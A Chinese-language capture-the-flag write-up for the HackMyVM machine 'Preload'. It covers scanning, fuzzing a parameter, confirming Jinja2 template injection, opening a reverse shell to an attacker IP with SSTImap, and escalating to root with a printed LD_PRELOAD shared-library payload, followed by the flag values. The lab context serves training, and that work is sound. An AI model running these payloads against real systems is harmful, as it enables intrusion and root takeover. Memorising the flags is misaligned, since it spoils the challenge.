# Preload

2025.01.01 https://hackmyvm.eu/machines/machine.php?vm=Preload

## Ip

192.168.5.21

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
```

80 web 服务扫描没发现什么隐藏的目录，但是在源代码中发现了一个连接 http://192.168.5.21/?multiply=7*7 好像存在模板注入，经过 SSTI 测试不存在注入。

在用 nc 连接目标的 5000 端口，出现错误，发现是个 Flask 框架搭建的，并且看到一个用户 /home/paul/code.py ，再次运行 nc 192.168.5.21 5000 目标服务器新创建了一个 50000 端口。

通过浏览器访问 50000 端口，发现目标使用的是 jinja2。但是需要找到http://192.168.5.21:50000中的传输参数，使用ffuf进行探测:

```
ffuf -t 100 -ac -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://192.168.5.21:50000?FUZZ=ls
```

最终发现 cmd 是参数，并且存在 SSTI：

```
curl -G --data-urlencode 'cmd={{7*7}}' http://192.168.5.21:50000
49
```

直接使用 SSTI，得到了反弹的 shell：

```
python3 /home/kali/Documents/SSTImap/sstimap.py -u http://192.168.5.21:50000?cmd={{7*7}} --reverse-shell 192.168.5.3 8888
```

先获得了 user flag：

```
paul@preload:~$ cat us3r.txt
52f83ff6877e42f613bcd2444c22528c
```

sudo -l 发现 LD_PRELOAD，直接可以提权到 root:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so cat
```

最终得到 root flag:

```
root@preload:~# cat 20o7.txt
09f7e02f1290be211da707a266f153b3
```
